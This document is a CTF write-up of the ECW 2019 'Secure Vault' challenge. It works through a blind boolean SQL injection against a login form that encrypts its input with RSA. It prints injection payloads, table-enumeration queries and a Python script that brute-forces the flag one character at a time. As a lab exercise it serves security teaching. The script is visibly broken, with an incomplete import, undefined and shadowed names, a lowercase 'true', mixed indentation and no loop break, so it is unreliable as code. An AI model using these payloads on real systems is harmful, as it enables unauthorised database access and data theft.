# ECW-Challenge 2019 Writeup: Secure Vault

Secure Vault is a challenge from the European Cyber Week qualification CTF and is a blind SQL-Injection with a little twist of encryption. Entering the Website, you are presented with a login form, asking for Username and Password. 

### Finding the entry point

Testing for a basic SQL injection by entering "'or 1=1; -- -'" results in the message "Welcome back! Unfortunately we are under maintenance, please come back later :)". Entering a false password results in an Error, so we have a boolean-based Injection.
<br />
While further testing, I discovered that when you enter two Queries, e.g. ```">' or 1=1; SLEEP(5)"```, we get a very verbose error, "You can only execute one query at a time", which reveals the actual query which equals to ```SELECT id, secret FROM users WHERE email=' . $USER_INPUT . '``` and also tells us about the DBMS, which is SQLite3.3.
<br />
My first guess  was that the admin password is the flag, but we know the Format (ECW{64HEX}) and testing for ```' or substr(secret,1,3)="ECW";``` resulted false.

### The exploit

From now on, a script should probably take over, to enumerate table- and field names. Looking at the request, the POST-payload carrying the credentials is cyphered. Looking at the source code, we find some important js-code:

```
$(document).ready(function () {
	$("#challenge").submit(function (event) {
		event.preventDefault();
		var encrypt = new JSEncrypt();
		encrypt.setPublicKey($('#pubkey').val());

		email = $('#email').val();
		passwd = $('#passwd').val();
		jsonlogin = {
			"email": email,
			"passwd": passwd
		}

		var encrypted = encrypt.encrypt(JSON.stringify(jsonlogin));
		$.post( "/login",{encrypted:encrypted}, function( data ) {
			$('#content').text(data)
			$('#msg_modal').on('shown.bs.modal', function () {}).modal('show');
		});
	})
});
```

And the related public key:
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6NxvZHf6eBzmIvfvRAOZ
UHPL8pzY5xdrFd0qa5Gh/E215tKFQ2vMMBpF/yyA2KE55bwaQnUPNkzPxPKV5MCL
rqdobV/HO6F4m4XIDP2PA6sJUmMjhh8X6aAzQ1rgMyF+J0z6zGY2kh2LtBAGDnu5
wfY+cORY/CyJZ7y8RRxEdeTDtsVnRe/xz++9cIF6e+yYqwJLa+nHD894oFbVlSok
NJh8e2eqpkIvfVotmp4JTjDJp9bpH+ibHWi3gj/o3SXvu832LHn1d5fANB9sQ44r
UjDfhr8h0bA8ZkO5Hj9W39M5WJK9MqzgV5lgb3patN0wOosPOKRBRKdA65jRbuxo
pwIDAQAB
-----END PUBLIC KEY-----
```

JSEncrypt uses RSA-PKCS1-v1.5. Of course Python has a library for this cypher-suite, so we can write a script to enumerate the tables and find the flag. But sometimes common sense can help to speed things up, so I tried some table names by hand. The obvious "vault" was the table name and "flag" the field name: 
```x' or (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name='vault');```
```x' or (SELECT flag FROM vault limit 1) like 'ECW{%```

Python will then do the annoying part.

```python
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import 
import base64
import json
import requests

public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6NxvZHf6eBzmIvfvRAOZ
UHPL8pzY5xdrFd0qa5Gh/E215tKFQ2vMMBpF/yyA2KE55bwaQnUPNkzPxPKV5MCL
rqdobV/HO6F4m4XIDP2PA6sJUmMjhh8X6aAzQ1rgMyF+J0z6zGY2kh2LtBAGDnu5
wfY+cORY/CyJZ7y8RRxEdeTDtsVnRe/xz++9cIF6e+yYqwJLa+nHD894oFbVlSok
NJh8e2eqpkIvfVotmp4JTjDJp9bpH+ibHWi3gj/o3SXvu832LHn1d5fANB9sQ44r
UjDfhr8h0bA8ZkO5Hj9W39M5WJK9MqzgV5lgb3patN0wOosPOKRBRKdA65jRbuxo
pwIDAQAB
-----END PUBLIC KEY-----"""

session = requests.session()

def inject(payload):
    jsonlogin = {
        "email":"test@test.de",
        "passwd":payload
    }
    json = json.dumps(jsonlogin, separators=(',', ':'))

    rsa_key = RSA.importKey(public_key)
    rsa_cipher = PKCS1_v1_5.new(rsa_key)
    encrypted = cipher.encrypt(json)
    post_data = base64.b64encode(encrypted)

    r = session.post("https://web_securevault.challenge-ecw.fr/login",
    	{"encrypted":post_data},
    	cookies={"session":"$MYSESSIONID"}) # do not forget the session cookie
     
   	if "Welcome Back" in r.text:
   		return true
   		
flag = "ECW{"
# length is 64
for i in range(0,64):
	# test each ascii char from '0' to 'z'
	for c in range(48,123):
		payload = "x' or (SELECT flag from vault limit 1) like '"+ flag + str(chr(c)) + "%"
		if inject(payload): # if positive result, we found the next char of the flag
			flag = flag + str(chr(c))
				
print('Flag: '+flag+'}')
```
And there is the flag

```ECW{9a058f5d7611685100ff42b26fc054782e061af786228f8208b988cba449cb41}```

Another interesting way would be to convert the above to a tampering script to utilise in combination with SqlMap, but for a simple challenge like this, I prefer to not use unneccesarily big tools.
